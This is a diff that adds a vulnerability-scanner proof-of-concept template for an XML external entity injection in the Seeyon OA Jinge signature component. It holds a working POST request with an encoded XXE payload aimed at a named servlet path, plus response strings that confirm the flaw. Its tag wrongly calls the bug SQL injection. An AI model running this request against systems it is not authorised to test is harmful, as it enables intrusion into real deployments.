@@ -1,0 +1,19 @@
+id: poc-yaml-seeyon-jinge-xxe
+info:
+  name: 致远OA 金格控件 XML外部实体注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 致远互联-OA
+requests:
+- method: POST
+  path: /seeyon/m-signature/RunSignature/run/getAjaxDataServlet?M=deleteUpdateObj&S=ajaxEdocSummaryManager
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: 'xmlValue=WZwhRE9DVFlQRSBBTllbPCFFTlRJVFkgcm9vdCBTWVNURU0gImh0dHA6Ly8xMjcuMC4wLjEvc2VleW9uIj5dPjxTaWduYXR1cmU%2bPEzpzWxkPjx2YWx1zSBJbmRleD0iUHJvdGVjdGx0zW0iPnRydWU8L3zhbHVlPjx2YWx1zSBJbmRleD0iVkFMVUUiPizyb290OZwvdmFsdWU%2bPC9GaWVszD48L1Npz25hdHVyzT5d&encode=true&imgvalue=MTIzNDU2Nzg5MDEyMzQ1Njc4OTAxMjM0NTY3ODkwMTIzNDU2Nzg5MDEyMzQ1Njc4OTAxMjM0NTY3ODkwMTIzNDVNVEl=&elemId=YWFh
+
+    '
+  expression: status_code == 200 && contains(body, "<title>异常处理页面</title>") && contains(body,
+    "系统级错误，请检查localhost.log查看详细异常堆栈：") && contains(body,"解析XML保护数据失败，请检查是否格式正确")
+variables: {}
+transport: http
